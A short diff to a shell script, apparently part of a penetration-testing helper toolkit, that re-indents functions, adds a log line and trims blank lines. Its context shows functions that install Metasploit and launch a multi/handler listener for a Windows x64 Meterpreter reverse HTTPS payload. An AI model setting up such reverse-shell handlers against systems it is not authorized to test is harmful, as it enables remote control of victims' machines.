@@ -5,7 +5,7 @@
 #############################################################
 
 qq-shell-handlers-msf-help() {
-  cat << "DOC"
+    cat << "DOC"
 
 qq-shell-handlers-msf
 ---------------------
@@ -22,6 +22,7 @@ DOC
 }
 
 qq-shell-handlers-install-msf() {
+    __info "Running $0..."
     __pkgs metasploit-framework
 }
 
@@ -34,9 +35,9 @@ qq-shell-handlers-msf-ssl-gen() {
 }
 
 qq-shell-handlers-msf-w64-https() {
-  qq-vars-set-lhost
-  qq-vars-set-lport
-  __msf << VAR
+    qq-vars-set-lhost
+    qq-vars-set-lport
+    __msf << VAR
 use exploit/multi/handler;
 set PAYLOAD windows/x64/meterpreter/reverse_https;
 set LHOST ${__LHOST};
@@ -48,10 +49,3 @@ exit
 VAR
 
 }
-
-
-
-
-
-
-
